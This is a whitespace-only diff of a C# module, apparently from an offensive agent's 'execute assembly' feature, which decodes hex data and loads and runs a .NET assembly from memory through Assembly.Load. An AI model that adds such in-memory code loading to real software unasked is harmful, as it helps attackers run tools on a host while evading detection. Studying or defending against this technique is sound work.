@@ -116,12 +116,12 @@ public class Module_execute_assembly
 
         return data;
     }
-	
-	public bool isPEFile(byte[] data)
-	{
-		byte[] subdata = new byte[]{data[0], data[1]};
-		return ((Encoding.UTF8.GetString(subdata) == "MZ")||(Encoding.UTF8.GetString(subdata) == "ZM"));
-	}
+    
+    public bool isPEFile(byte[] data)
+    {
+        byte[] subdata = new byte[]{data[0], data[1]};
+        return ((Encoding.UTF8.GetString(subdata) == "MZ")||(Encoding.UTF8.GetString(subdata) == "ZM"));
+    }
 
     public string[] doExecuteAssembly(string as_filedata, string as_namespace, string as_class, string as_method, string[] as_args)
     {
@@ -130,18 +130,18 @@ public class Module_execute_assembly
         try
         {
             byte[] as_filedata_bytes = hex2Bin(as_filedata);
-			Assembly assembly = null;
-			
-			if (isPEFile(as_filedata_bytes))
-			{
-				assembly = Assembly.Load(as_filedata_bytes);
-			}
-			else
-			{
-				string as_filedata_str = hex2Str(as_filedata);
-				assembly = Assembly.Load(as_filedata_str);
-			}
-			
+            Assembly assembly = null;
+            
+            if (isPEFile(as_filedata_bytes))
+            {
+                assembly = Assembly.Load(as_filedata_bytes);
+            }
+            else
+            {
+                string as_filedata_str = hex2Str(as_filedata);
+                assembly = Assembly.Load(as_filedata_str);
+            }
+            
             string fullTypeName = as_namespace + "." + as_class;
             Type assembly_type = assembly.GetType(fullTypeName);
             if (assembly_type == null)
